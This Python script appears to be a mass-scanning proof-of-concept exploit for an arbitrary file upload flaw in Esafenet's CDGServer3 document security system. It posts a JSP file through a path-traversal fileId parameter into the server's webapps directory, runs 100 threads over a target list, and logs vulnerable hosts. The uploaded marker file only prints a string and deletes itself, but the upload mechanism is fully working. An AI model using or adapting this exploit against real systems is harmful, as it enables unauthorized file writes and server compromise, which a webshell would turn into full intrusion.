import requests
import re
import argparse
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
        .__             /\             
  _____ |__| ____    ___)/___.__.__ __ 
 /     \|  |/    \  / ___<   |  |  |  \
|  Y Y  \  |   |  \/ /_/  >___  |  |  /
|__|_|  /__|___|  /\___  // ____|____/ 
      \/        \//_____/ \/          
                                   version:1.1.1                           
"""
    print(test)

def main():
    banner()
    #处理命令行输入的参数
    parser = argparse.ArgumentParser(description="亿赛通电子文档安全管理系统任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input file')
    #处理参数
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")
def poc(target):
    payload = '/CDGServer3/DecryptApplicationService2'
    url = target + payload
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close'
}
    params = {
    'fileId': '../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/test111.jsp'
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    data = '<%out.print("test1234");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>'
    res = requests.get(url=target)
    if res.status_code == 200:
        try:
            response = requests.post(url=url,headers=headers,params=params,verify=False,data=data,proxies=proxies)
            if response.status_code == 200 :
                print(f"[*该网址存在任意文件上传漏洞{target}]")
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f"[+该网址不存在任意文件上传漏洞{target}]")
        except Exception as e:
            print(f"[-该网址存在问题，请手动检测{target}]")

if __name__ =='__main__':
    main()